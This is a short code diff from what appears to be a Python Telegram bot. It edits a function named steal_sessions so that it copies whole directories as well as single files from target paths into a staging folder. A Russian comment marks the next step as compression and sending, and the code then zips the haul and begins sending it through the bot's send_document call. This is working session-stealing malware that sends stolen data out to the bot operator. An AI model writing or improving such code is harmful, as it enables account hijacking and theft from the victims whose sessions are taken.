@@ -59,9 +59,13 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         
         for p in paths:
-            if Path(p).exists():
-                shutil.copy(p, STEAL_DIR)
-                
+            path_obj = Path(p)
+            if path_obj.exists():
+                if path_obj.is_dir():
+                    shutil.copytree(p, STEAL_DIR / path_obj.name, dirs_exist_ok=True)
+                else:
+                    shutil.copy(p, STEAL_DIR)
+        
         # Сжатие и отправка
         shutil.make_archive("sessions_pack", "zip", STEAL_DIR)
         await context.bot.send_document(
